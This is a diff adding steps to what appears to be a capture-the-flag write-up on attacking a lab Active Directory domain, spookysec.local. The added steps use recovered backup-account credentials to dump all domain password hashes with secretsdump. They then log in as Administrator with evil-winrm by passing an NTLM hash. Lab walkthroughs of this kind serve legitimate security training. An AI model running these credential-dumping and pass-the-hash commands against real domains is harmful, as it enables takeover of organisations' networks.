@@ -135,3 +135,16 @@ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
 <figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 ### Elevating Privileges within the Domain
+
+```
+python3 /usr/local/bin/secretsdump.py  spookysec.local/backup:backup2517860@$VICTIM > allhashes.txt
+cat allhashes.txt | awk -F : '{print $1 ":" $3}' | sort | uniq
+```
+
+
+
+### Flag Submission PaneLogin as Administrator&#x20;
+
+```
+evil-winrm -i $VICTIM -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+```
